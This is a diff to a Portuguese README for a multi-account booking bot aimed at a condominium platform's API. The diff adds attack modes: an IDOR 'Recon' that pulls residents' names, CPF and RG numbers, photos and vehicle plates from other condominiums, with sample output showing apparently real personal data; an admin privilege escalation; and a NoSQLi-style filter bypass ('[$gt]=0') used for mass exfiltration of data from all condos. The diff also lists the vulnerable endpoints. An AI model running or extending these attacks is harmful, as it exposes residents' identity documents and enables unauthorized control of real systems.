@@ -44,6 +44,9 @@ flowchart LR
         SWAP["🔄 Troca<br/>Cancel + Rebook"]
         RADAR["📡 Radar<br/>Vigília + Auto-Book"]
         RANK["🏆 Ranking<br/>Análise de Bots"]
+        RECON["🔍 Recon<br/>IDOR Cross-Tenant"]
+        ADMIN["⚡ Admin<br/>Privilege Escalation"]
+        DUMP["💀 Dump<br/>Mass Exfiltration"]
     end
 
     subgraph API["🏢 Hub 2.0 API"]
@@ -65,6 +68,9 @@ flowchart LR
 | **Radar** | Monitora cancelamentos e auto-reserva em tempo real |
 | **Ranking** | Análise de boteiros: top users, horários e áreas mais disputadas |
 | **Troca** | Cancel conta A → reserva conta B (atômico, <200ms) |
+| **Recon** | IDOR cross-condomínio: moradores (CPF, RG, foto) + veículos (placa) |
+| **Admin** | Privilege escalation: criar/remover bloqueios, gerenciar horários |
+| **Dump** | Mass dump: todas reservas/áreas de todos condos via bypass NoSQLi |
 | **Interfaces** | Python CLI · Rust 2.3MB · Node.js (zero deps) · HTML + proxy |
 
 ---
@@ -283,12 +289,90 @@ python3 auto_booking.py --trocar 1332456
 python3 auto_booking.py --trocar 1332456 --conta 1 --conta2 2
 ```
 
-O que acontece:
-1. Busca detalhes da reserva (área, horário)
-2. Renova tokens de ambas as contas
-3. Cancela a reserva original
-4. **Imediatamente** tenta reservar com a outra conta (5 tentativas)
-5. Se alguém pegar no meio → alerta
+### 12. 🔍 Recon — IDOR Cross-Condomínio
+
+Acessa dados de **qualquer condomínio** da plataforma — moradores com CPF, RG, foto e veículos com placa:
+
+```bash
+# Recon do seu condomínio
+python3 auto_booking.py --recon
+
+# Recon de OUTRO condomínio (IDOR)
+python3 auto_booking.py --recon --condo 2079
+```
+
+```
+  🔍 RECON — Condominio 2079
+
+  👥 Moradores (liberacaoAcesso)
+
+     #  Nome                                 CPF             RG            Unidade   Tipo
+     1  FLAVIA ROZEANE DA SILVA              08598934488                   5 263     Funcionario
+     2  GABRIEL TEIXEIRA SILVA               30858480883      323980077    4 174     Morador
+  ...
+  Total: 17 moradores
+
+  🚗 Veiculos (portaria)
+
+     #  Placa       Dono                            Unidade   Tipo
+     1  DHY1H43     ANDRE MONTES GUTIERREZ LAGUNA   3 043     Carro
+  ...
+  Total: 8 veiculos
+```
+
+> **Vulnerabilidade**: IDOR em `/liberacaoAcesso/{cond}/ativas` e `/portaria/{cond}/veiculo`.
+> A API não valida se o usuário pertence ao condomínio consultado. Dados salvos em `recon/`.
+
+### 13. ⚡ Admin Mode — Privilege Escalation
+
+Funções de **síndico/admin** acessíveis por morador normal:
+
+```bash
+# Criar bloqueio de área (impede reservas)
+python3 auto_booking.py --bloquear --area 17 --data 2026-04-01 --descricao "Manutenção"
+
+# Bloqueio com range de datas
+python3 auto_booking.py --bloquear --area 17 --data 2026-04-01 --data-fim 2026-04-03
+
+# Remover bloqueio (inclusive bloqueios de ADMIN)
+python3 auto_booking.py --desbloquear 119439
+```
+
+No menu interativo (opção 13):
+- **Bloqueios**: listar, criar, remover — bloqueia/desbloqueia áreas inteiras
+- **Horários**: listar, criar, deletar — gerencia schedules de funcionamento
+- **Config**: ver config admin completa de todas as áreas
+
+> **Vulnerabilidade**: `POST/PUT /areaConfiguracao/{area}/bloqueio` e `POST/DELETE /areaConfiguracao/{area}/horario`
+> não verificam se o usuário é admin/síndico. Morador normal tem controle total.
+
+### 14. 💀 Dump — Exfiltração Massiva Cross-Condomínio
+
+Explora bypass NoSQLi-style (`[$gt]=0`) para extrair dados de **todos** os condominios da plataforma:
+
+```bash
+python3 auto_booking.py --dump
+```
+
+```
+  💀 DUMP MODE — Exfiltracao massiva cross-condominio
+
+  ⏳ Baixando todas as reservas... OK
+  📊 2931 reservas | 165 condominios | 1629 moradores
+
+  ⏳ Baixando todas as areas... OK
+  📊 1636 areas | 452 condominios
+
+  🏢 Top condominios por reservas:
+
+    467  ██████████████████████ 2078 - CONDOMINIO PAULISTANO
+    385  █████████████████ 2646 - COND ALTTO VILA MADALENA
+    202  █████████ 1378 - ASSOC BOSQUE DOS JATOBAS
+  ...
+```
+
+> **Vulnerabilidade**: Parâmetros `[$gt]`/`[$ne]` fazem o ASP.NET ignorar o filtro de condomínio.
+> Dados salvos em `dump/`.
 
 ---
 
@@ -332,7 +416,7 @@ graph TB
 
 | Camada | Arquivo | Função |
 |:-------|:--------|:-------|
-| **Python CLI** | `auto_booking.py` | Menu interativo + flags CLI, N contas, sniper, espião, troca, radar, ranking |
+| **Python CLI** | `auto_booking.py` | Menu interativo + flags CLI, N contas, sniper, espião, troca, radar, ranking, recon, admin, dump |
 | **Binário Rust** | `hub20-cli/` | Mesmo conjunto de funcionalidades, binário nativo 2.3MB |
 | **Node.js CLI** | `hub20.mjs` | Zero deps (fetch nativo), menu + flags, all features |
 | **Dashboard Web** | `index.html` | Interface visual com countdown, requer proxy |
@@ -401,6 +485,8 @@ python3 server.py    # inicia proxy em :8080
 
 ## 📡 Referência da API
 
+> **Swagger exposto em produção**: `/swagger/v1/swagger.json` em ambos backends (81 + 55 endpoints).
+
 | Método | Endpoint | Descrição |
 |:-------|:---------|:----------|
 | `POST` | `/api/v1/login` | Autenticação → retorna JWT |
@@ -409,6 +495,15 @@ python3 server.py    # inicia proxy em :8080
 | `POST` | `/api/v1/reservas` | Criar reserva |
 | `POST` | `/api/v1/reservas/{id}/cancelar` | Cancelar reserva |
 | `GET` | `/api/v1/reservas` | Todas as reservas (IDOR) |
+| `GET` | `/api/v1/liberacaoAcesso/{cond}/ativas` | **IDOR** Moradores: nome, CPF, RG, foto |
+| `GET` | `/api/v1/portaria/{cond}/veiculo` | **IDOR** Veículos: placa, dono, unidade |
+| `POST` | `/api/v1/areaConfiguracao/{area}/bloqueio` | **Priv Esc** Bloquear área (admin) |
+| `PUT` | `/api/v1/areaConfiguracao/{area}/bloqueio/{id}` | **Priv Esc** Desativar bloqueio |
+| `POST` | `/api/v1/areaConfiguracao/{area}/horario` | **Priv Esc** Criar schedule |
+| `DELETE` | `/api/v1/areaConfiguracao/{id}/horario` | **Priv Esc** Deletar schedule |
+| `GET` | `/api/v1/areaConfiguracao/{cond}` | Config admin de áreas |
+| `GET` | `/api/v1/financeiro/{cond}/prestacaocontas/periodos` | **IDOR** Dados financeiros |
+| `GET` | `/swagger/v1/swagger.json` | Spec OpenAPI exposta |
 
 <details>
 <summary><strong>Corpo da requisição de reserva</strong></summary>
@@ -450,6 +545,9 @@ python3 server.py    # inicia proxy em :8080
 | Troca (cancel+rebook) | ✅ | ✅ | ✅ | ✅ |
 | Radar (auto-book) | ✅ | — | — | — |
 | Ranking (bot analysis) | ✅ | — | — | — |
+| **Recon (IDOR cross-condo)** | ✅ | — | — | ✅ |
+| **Admin (priv escalation)** | ✅ | — | — | ✅ |
+| **Dump (mass exfiltration)** | ✅ | — | — | ✅ |
 | Renovação de token | ✅ | ✅ | ✅ | ✅ |
 | Config persistente | ✅ | ✅ | ✅ | — |
 | Multiplataforma | ✅ | ✅ | ✅ | ✅ |
